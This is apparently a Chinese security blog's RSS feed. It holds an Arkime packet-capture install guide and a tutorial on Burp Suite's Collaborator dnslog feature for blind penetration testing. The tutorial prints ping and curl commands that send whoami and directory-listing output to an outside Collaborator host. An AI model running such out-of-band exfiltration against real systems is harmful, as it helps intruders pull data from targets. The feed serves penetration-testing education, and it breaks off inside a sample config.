<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>网络安全 on runshell</title><link>https://runshell.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络安全 on runshell</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 15 Jul 2024 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>Centos Stream9安装Arkime</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/</link><pubDate>Mon, 15 Jul 2024 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/centos-stream9%E5%AE%89%E8%A3%85arkime/</guid><description>&lt;img src="https://runshell.github.io/images/Arkime_Logo.png" alt="Featured image of post Centos Stream9安装Arkime" /&gt;&lt;h2 id="下载包"&gt;下载包
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget https://mirror.ghproxy.com/https://github.com/arkime/arkime/releases/download/v4.3.0/arkime-4.3.0-1.el9.x86_64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="安装依赖"&gt;安装依赖
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;yum install -y perl-libwww-perl perl-JSON perl-LWP-Protocol-https
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="安装-arkime"&gt;安装 arkime
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;rpm -i arkime-4.3.0-1.el9.x86_64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="阅读-readme"&gt;阅读 readme
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat /opt/arkime/README.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="查看网卡清楚管理口网卡和用于接收镜像的网卡"&gt;查看网卡，清楚管理口网卡和用于接收镜像的网卡
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ifconfig
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="执行配置脚本进行交互式配置"&gt;执行配置脚本进行交互式配置
&lt;/h2&gt;&lt;p&gt;根据提示选择镜像网卡，输入密码等。配置过程会自动安装 elasticsearch，如果是内网机需手动安装，elasticsearch 可自行安装，本机部署建议监听 127.0.0.1&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/opt/arkime/bin/Configure
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="启动服务"&gt;启动服务
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl start elasticsearch.service
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 开机自启&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl enable elasticsearch.service
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;netstat -lnp | grep &lt;span style="color:#ae81ff"&gt;9200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="初始化-elasticsearch"&gt;初始化 elasticsearch
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/opt/arkime/db/db.pl http://127.0.0.1:9200 init
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="添加-web-管理员账号"&gt;添加 web 管理员账号
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/opt/arkime/bin/arkime_add_user.sh cbtdadmin &lt;span style="color:#e6db74"&gt;&amp;#34;Admin User&amp;#34;&lt;/span&gt; fuzak0uling --admin
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="启动服务-1"&gt;启动服务
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl start arkimecapture.service
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl start arkimeviewer.service
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl enable arkimecapture.service
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl enable arkimeviewer.service
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;netstat -lnp | grep &lt;span style="color:#ae81ff"&gt;8005&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="出现-bug-查看日志"&gt;出现 bug 查看日志
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat /opt/arkime/logs/viewer.log
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat /opt/arkime/logs/capture.log
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 出现 bug 查看 seLinux 开关&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;getenforce
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 主机防火墙配置&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;firewall-cmd --add-rich-rule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;rule family=&amp;#34;ipv4&amp;#34; source address=&amp;#34;10.x.x.x&amp;#34; port port=8005 protocol=&amp;#34;tcp&amp;#34; accept&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;firewall-cmd --runtime-to-permanent
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="可能缺失的文件"&gt;可能缺失的文件
&lt;/h2&gt;&lt;h3 id="国内访问需要使用镜像站"&gt;国内访问需要使用镜像站
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget &lt;span style="color:#e6db74"&gt;&amp;#34; https://mirror.ghproxy.com/https://raw.githubusercontent.com/wireshark/wireshark/master/manuf&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mv manuf /opt/arkime/etc/oui.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="通常无需访问镜像站"&gt;通常无需访问镜像站
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget &lt;span style="color:#e6db74"&gt;&amp;#34;https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.csv&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;vi /opt/arkime/bin/arkime_update_geo.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mv ipv4-address-space.csv /opt/arkime/etc/
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systemctl restart arkimecapture.service
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="优化配置"&gt;优化配置
&lt;/h2&gt;&lt;h3 id="清理-60-天以前的流量日志"&gt;清理 60 天以前的流量日志
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crontab -e
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; * * * /opt/arkime/db/db.pl 127.0.0.1:9200 expire daily &lt;span style="color:#ae81ff"&gt;60&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="配置-elasticsearch-水位线"&gt;配置 elasticsearch 水位线
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -X PUT &lt;span style="color:#e6db74"&gt;&amp;#34;http://127.0.0.1:9200/_cluster/settings?pretty&amp;#34;&lt;/span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; -d&lt;span style="color:#e6db74"&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;persistent&amp;#34;: {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;cluster.routing.allocation.disk.watermark.low&amp;#34;: &amp;#34;90gb&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;cluster.routing.allocation.disk.watermark.high&amp;#34;: &amp;#34;50gb&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;cluster.routing.allocation.disk.watermark.flood_stage&amp;#34;: &amp;#34;10gb&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;cluster.info.update.interval&amp;#34;: &amp;#34;1m&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;}&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="配置删除-pcap-包保证空闲磁盘空间"&gt;配置删除 pcap 包保证空闲磁盘空间
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;vi /opt/arkime/etc/config.ini
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;freeSpaceG&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Burp suite中的dnslog</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/</guid><description>&lt;img src="https://runshell.github.io/images/1536409490993.png" alt="Featured image of post Burp suite中的dnslog" /&gt;&lt;p&gt;[注]本文提到的 burp 均为付费专业版，免费社区版不具有该功能。&lt;/p&gt;
&lt;h2 id="0x00-什么是-dnslog"&gt;0x00 什么是 dnslog
&lt;/h2&gt;&lt;p&gt;dnslog，顾名思义，就是 dns 服务产生的日志。有什么用呢？我们可以用子域名来携带出信息。&lt;/p&gt;
&lt;p&gt;这种套路主要用于渗透测试中的盲打。执行系统命令没有回显的时候，sql 盲注的时候，xss 想将 cookie 带出来的时候……将你想得到的信息放在自己的域名前面作为子域名，dns 服务器解析该域名时产生的日志中将会包含整个域名。如果携带的信息太长，可能 dns 就携带不了了，好在通常 dnslog 平台同时也提供 http 日志，可以使用 http 请求携带更多信息。&lt;/p&gt;
&lt;h2 id="0x01-burp-suite-中的-dnslog-功能"&gt;0x01 burp suite 中的 dnslog 功能
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Collaborator client&lt;/strong&gt; ，相比 Burp 中的&lt;code&gt;proxy&lt;/code&gt;、&lt;code&gt;instruder&lt;/code&gt;、&lt;code&gt;scanner&lt;/code&gt;等功能，这个功能可能鲜为人知了吧！启动位置如下图，&lt;code&gt;Butp&lt;/code&gt;→&lt;code&gt;Burp Collaborator client&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536408720503.png"
loading="lazy"
alt="Collaborator"
&gt;&lt;/p&gt;
&lt;p&gt;启动 Collaborator client 后显示如下页面，burp 会分配给我们一个三级域名，点击&lt;code&gt;Copy to clipbord&lt;/code&gt;可以将域名复制到粘贴板，如&lt;code&gt;p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536409490993.png"
loading="lazy"
alt="1536409490993"
&gt;&lt;/p&gt;
&lt;p&gt;下面举个简单的例子，在 Linux shell 中执行如下命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ping &lt;span style="color:#e6db74"&gt;`&lt;/span&gt;whoami&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;.p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;点击 Collaborator client 窗口中的 Poll now 获取 dnslog，如下图，在 log 条目区域显示两条日志，在下面的日志详情中我们看到了从子域名中携带出了&lt;code&gt;whoami&lt;/code&gt;的执行结果。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536409951024.png"
loading="lazy"
alt="1536409951024"
&gt;&lt;/p&gt;
&lt;p&gt;如果想执行 ls 查看根目录有哪些文件，用 dns 携带不了那么多信息，转而使用 http 请求，执行如下命令：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style="color:#e6db74"&gt;&amp;#34;`ls -al /`&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再次点击 Collaborator client 窗口中的 Poll now 获取 log，我们可以在 log 区看到一条 http 日志，我们查看请求原始信息可以看到请求体中携带出了&lt;code&gt;ls -al /&lt;/code&gt;的执行结果。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536410609261.png"
loading="lazy"
alt="1536410609261"
&gt;&lt;/p&gt;
&lt;p&gt;有没有觉得明文携带这些信息太不安全了？可是使用 https 安全传送，例如：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl https://p1rf8orun99jx1pa9ayqx55quh07ow.burpcollaborator.net -d &lt;span style="color:#e6db74"&gt;&amp;#34;`ls -al /`&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后的结果和使用 http 一样。burp 的 dnslog 功能也是相当全的。&lt;/p&gt;
&lt;h2 id="0x02-私有的-collaborator-server"&gt;0x02 私有的 Collaborator server
&lt;/h2&gt;&lt;p&gt;上面举例的是使用 burp 的公共 Collaborator server，有时我们需要使用私有的 Collaborator server。使用公共的 Collaborator server，但是，信息存储在别人的服务器上是没有保密性可言的。还有一种情况，就是需要渗透的目标在内网且不与外网互通的情况下，就得使用私有的 Collaborator server。
下面我们来看看如何搭建私有的 Collaborator server。burp 提供了搭建 Collaborator server 的功能，在服务器上执行&lt;code&gt;sudo java -jar burp.jar --collaborator-server&lt;/code&gt; 即带&lt;code&gt;--collaborator-server&lt;/code&gt;参数运行 burp 即可启动服务。
然后在客户端配置，以此打开&lt;code&gt;Project options&lt;/code&gt;→&lt;code&gt;Misc&lt;/code&gt;→&lt;code&gt;Burp Collaborator server&lt;/code&gt; ，选择&lt;code&gt;Use a private Collaborator server&lt;/code&gt; ，在&lt;code&gt;Server location&lt;/code&gt;中设置服务器域名，没有域名的情况下可以使用 IP，如果按 IP 地址指定服务器，则无法使用依赖于 DNS 解析的 Burp 与 Collaborator 相关的功能。 另外，默认情况下，Burp 通过 HTTPS 轮询 Collaborator 服务器，并强制实施 SSL 信任以防止中间人攻击。如果您的 Burp 实例由于网络或其他限制而无法通过 HTTPS 直接轮询，您可以选择轮询未加密的 HTTP。由于没有配置 ssl 证书，所以此处勾选&lt;code&gt;Poll over unencrypted HTTP&lt;/code&gt;即使用未加密的 http 轮询。详情如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536415372083.png"
loading="lazy"
alt="1536415372083"
&gt;&lt;/p&gt;
&lt;p&gt;最后，我们点击&lt;code&gt;Run health check...&lt;/code&gt;进行检查，发现部分可功能不可用，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536415454865.png"
loading="lazy"
alt="1536415454865"
&gt;&lt;/p&gt;
&lt;p&gt;幸运的是，已经可以使用 http 请求了，使用方法和使用公共 Collaborator server 时一样，参见本文[0x01]。若要充分利用 Collaborator 服务器的功能，通常还需要创建合适的&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format" target="_blank" rel="noopener"
&gt;配置文件&lt;/a&gt;。
以下配置相关类容来自 burp 官网，然后机翻的结果：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;协作者配置文件格式
Burp Collaborator 服务器的所有选项均使用配置文件进行控制。默认情况下，Collaborator 服务器 在当前工作目录中查找名为 collaborator.config 的文件 。可以使用&amp;ndash;collaborator-config 参数从命令行覆盖此位置 ，例如:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo java -jar burp.jar --collaborator-server --collaborator-config = myconfig.config&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;配置文件使用 JSON 格式，支持注释。如果需要 IP 地址，您可以配置单个地址或地址列表。例如，以下任一项都可用于配置网络接口的本地地址:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;localAddress&amp;quot;:&amp;quot;10.20.0.159&amp;quot; &lt;/code&gt; &amp;gt;&lt;code&gt;&amp;quot;localAddress&amp;quot;:[&amp;quot;10.20.0.159&amp;quot;，&amp;quot;127.0.0.1&amp;quot;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;完整的示例配置文件以及每个可用选项的说明如下所示:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;serverDomain&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;burpcollaborator.example.com&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;workerThreads&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;eventCapture&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;localAddress&amp;#34;&lt;/span&gt;: [&lt;span style="color:#e6db74"&gt;&amp;#34;10.20.0.159&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;publicAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;10.20.0.159 &amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;http&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ports&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;https&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ports&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;443&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;smtp&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ports&amp;#34;&lt;/span&gt;: [&lt;span style="color:#ae81ff"&gt;25&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;587&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;smtps&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ports&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;465&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ssl&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;certificateFiles&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;keys / burpcollaborator.example.com.key.pkcs8&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;keys / burpcollaborator.example.com.crt&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;keys / intermediate.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;polling&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;localAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,
